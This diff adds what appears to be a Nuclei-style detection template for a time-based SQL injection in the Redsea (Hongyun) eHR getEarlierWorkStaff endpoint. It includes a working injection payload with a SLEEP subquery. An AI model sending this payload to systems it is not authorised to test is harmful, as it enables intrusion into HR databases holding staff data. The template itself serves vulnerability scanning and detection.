@@ -1,0 +1,55 @@
+id: poc-yaml-hr-soft-getearlierworkstaff-sqli
+info:
+  name: 红海云eHR getEarlierWorkStaff SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1)+2}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/RedseaPlatform/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/RedseaPlatform/skins/images/favicon.ico"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/RedseaPlatform/BossIndex.mob"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      method=getEarlierWorkStaff&struTreeCode=%27+AND+(SELECT+3266+FROM+(SELECT(SLEEP({{t1}})))ShXk)+AND+%27qmyT%27=%27qmyT
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"meg\":\"处理成功\""
+          - "\"jsonList\":"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
+      - type: word
+        part: header
+        words:
+          - "text/json"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
